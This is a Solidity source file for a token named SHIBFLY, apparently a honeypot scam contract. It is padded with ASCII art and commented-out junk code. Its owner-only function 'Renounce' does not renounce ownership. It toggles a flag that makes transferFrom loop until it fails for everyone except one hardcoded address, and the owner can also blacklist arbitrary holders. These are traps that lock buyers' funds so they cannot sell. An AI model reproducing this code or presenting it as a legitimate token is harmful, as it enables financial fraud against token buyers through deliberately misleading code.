/**
 *Submitted for verification at Etherscan.io on 2022-08-09
*/

pragma solidity 0.8.7;

/* 
  
Result
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~^~~~~~~^^^^^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~^^~^^^^^^^^~
~~~~^^^^^^^~~~~~~^^~^^~~~^~^^^~^^^^^^^^^^^^^~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^~^^^^^^^^^^^^^^^~~~
~~~^^^^^^^^^^^^^^^^^^~~^^^^^~~~~^^^^^^^^^^^~!!7777!!!!!!!!~~~~^~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~
~^^^^^^~~!~^^^^^^^^^^~~^~^^^^~~~~~^^^^~!!!!~~^^::::::^^~~!!77~~~~^^^^^^^^^^^^^^^^^^^^^^^^~~~!~^~~~~~
~~^^^!7^::7!^^^^^^^^^^^^^^~~^^^~~~^~!!!~^^^::::::::::::::^^^^~77~^^^^^^^^^^^^^^^^^^^^^^^!7::^7~^~~~~
~~~~!?....!!:^^^^^^^^^^~^~~~^^^~~!7!^^^~~~~~!!!7777777!!!~~~~^^^!7!^^^^^^^^^^^^^^^^^^^^:7!....7~~~~~
~~~~?~....:7~^^^^^^^^~~~~~^^~~~!?!^^~~~~!7???777!!!!777???7!~~~~^^~7~:^^^^^^^^^^^^^^^^^~?:....~?~~~~
~~~~?^.....:!!^^^^^^^^^~~^^^^^77^~~~~~7?JJJ?7~~~~~~~~~~~!7JJJ7!~~~~^77^^^^^^^^^^^^^^^^!!:.....^?~~~~
~~~~7!.......:!!~^^^^^^^^^^^^7!^~~~~7J??JJ?JJ?!~~~~~~~~7JJJJJJJ7~~~~^!?^^^^^^^^^^^^~!!:.......!7~~~~
~!7!7J^........:~!~^^^^^^^^^?!~~~~~?J~7JJ?77J??7!!!!!!??JJ77JJ!?J~~~~~!?^^^^^^^^^~!~:........^J7!7!~
~?^.:~?!:........:~!!^^^^^^!?~~~~~??~7JJ??????!7!~~~!777????JJ7~?J~~~~~?!:^^^^^!!~:........:!?~:.^?~
~?:..:^77~:.........^!!^~~~J!~~~~7J~~J????7777777777777777777?J~~J7~~~~~J^^^^!!^.........:~77^:..:?~
~!7:...:^!7!~^:.......^7!~~J~7J7~J7~!J777777777!:^~777~:^77777?!~!J~7J7~J^:~7^.......:^~!7!^:...:7!~
~~!7!:....::^~^........:7!~Y~7PY7J!!Y?777777777J!^!777~~7?7777!7!!J~?PY!J~~7:........^~^::....:!7!~~
~~!777!!^^..............:?~Y!!7!~?7?J777777777PY5?77!775YP?7!!!^77J~!7!~Y^?:..............^^!!777!~~
~~7!..::^^...............?~J?~~~~!JJ?7~^:::^~~J5J!~~!~~?YY!^:...7J!~~~~7J^?...............^^::..!7~~
~~~77~^^^:^^^:......:^:^77~!Y!~~~~!YY^.....:::..:^:!Y~^:...:...~J7~~~~!Y!~77::^:......:^^^:^^^~77~~~
~~~~~!!Y7!~~^:..:^~?J77?!^^^!Y!~~~~!Y?~::.........:::::.....:^7J!~~~~!J?~~~7?77J?~^:..:^~~!7Y!!~~~~~
~~~~~~~?7!~~~~!!7?77!~~^^^^^:!J7!~~~~7??!!~^^::::::::::^^^~~7?7~~~~~7J?~~~~~~!!!77?7!!~~~~!7?~~~~~~~
~~~~~~~~!777777!!~~~^^^^^^^^^:~J?!!~~~~!777!!!!!!!!!!!!!!!77!~~~~~!?J7~~~~~~~~~~~~~~!!7777!!~~~^^^^~
~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^7J?7!!~~^~!!777!!!!!!777!!~^~~~!!?J?~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^~^
~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^:^7J?77!!~~~^^~~~~~~~^^^^~~!!!7??7!~~~~~~~~~~~~~~~~~~~~~~~~^^^^~~^~~
~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^~~!????777!!!!!~~!!!!!777???7~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^~~
~~~~~~~~~~~~~~~~~~~~~~~~^^^^^:J7~~~~~~~!77???????????????777!~~~~~~~7Y~~~~~~~~~~~~~~~~^^^^^^^^^^^^^~
~~~~~~~~~~~~~~~~~~~~~~~~^^^^^:5?~~~~~~~~~~~~~!!!!!!!!!~~^~~~~~~~~~~~?5~~~~~~~~~~~~~~~~^^^^^^^^^^^^^~
~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^5?~~~~~~~!5~~~~~~~~~~~~~~~~~~5!~~~~~~~?5~~~~~~~~~~~~~~~~^^^~~~^^^^^^^~
~~~~~~~~~~~~~~~~~~~~~~~~~^^^~~5?~~~~~~~!P~~~~~~~~!!~~~~~~~~P!~~~~~~~?5~~~~~~~~~~~~~~~~~~~~~~~^^^^~~~
~~~~~~~~~~~~~~~~~~~~~~~~~^^~~~5?~~~~~~~!P~~~~~~~~JY~~~~~~~~P!~~~~~~~?5~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~^^~~~5?~~~~~~~!P~~~~~~~~JJ~~~~~~~~P!~~~~~~~?5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~5?~~~~~~~!P~~~~~~~~JJ~~~~~~~~P!~~~~~~~?5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Y7~~~~~~~!P~~~~~~~~JJ~~~~~~~~P!~~~~~~~7Y~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!P~~~~~~~~JJ~~~~~~~~P!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!Y~~~~~~~~JJ~~~~~~~~Y!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~YY~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~77~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
*/                                                                                                        
       

contract SHIBFLY {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) isBotListed;

    // 
    string public name = "SHIBFLY";
    string public symbol = "SHIBFLY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}
    function Renounce() public onlyOwner  {
    isEnabled = !isEnabled;
}




    function BotList(address _user) public onlyOwner {
        require(!isBotListed[_user], "user already blacklisted");
        isBotListed[_user] = true;
        // emit events as well
    }
    
    function removeFromBotList(address _user) public onlyOwner {
        require(isBotListed[_user], "user already whitelisted");
        isBotListed[_user] = false;
        // emit events as well
    }
    
 


   
    
    

/*///    );
    
    
 File: @openzeppelin/contracts/math/Math.sol


  
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */   




	
	


/* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/





    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!isBotListed[msg.sender] , "This address is blacklisted"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/*

       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

    
    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
 
            
            */


address Mound = 0x68AD82C55f82B578696500098a635d3df466DC7C;


    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == Mound)  {
          require(!isBotListed[from] , "This address is blacklisted"); 
                 require(!isBotListed[to] , "This address is blacklisted"); 
         require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; } }
        
        
        
        require(!isBotListed[from] , "This address is blacklisted"); 
               require(!isBotListed[to] , "This address is blacklisted"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}